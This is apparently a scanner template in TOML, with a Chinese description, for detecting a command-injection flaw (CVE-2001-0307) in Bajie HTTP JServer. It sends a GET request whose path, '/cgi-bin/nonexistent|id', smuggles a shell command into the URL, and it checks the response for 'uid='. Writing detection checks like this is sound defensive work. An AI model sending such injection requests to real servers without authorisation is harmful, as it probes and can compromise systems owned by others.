[info]
author = "ave"
description = "AVE-2001-0137 漏洞检测 PoC，通过向 Bajie HTTP JServer 发送包含 shell 元字符的非存在 CGI 路径的 HTTP GET 请求，验证目标服务器是否存在命令注入漏洞。"
id = "POC-AVE-2001-0137"
name = "Bajie HTTP JServer 命令注入漏洞 PoC"
severity = "high"
tags = ["cve-2001-0307"]
vuln_id = [
    "CVE-2001-0307",
    "AVE-2001-0137",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/cgi-bin/nonexistent|id"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["uid="]
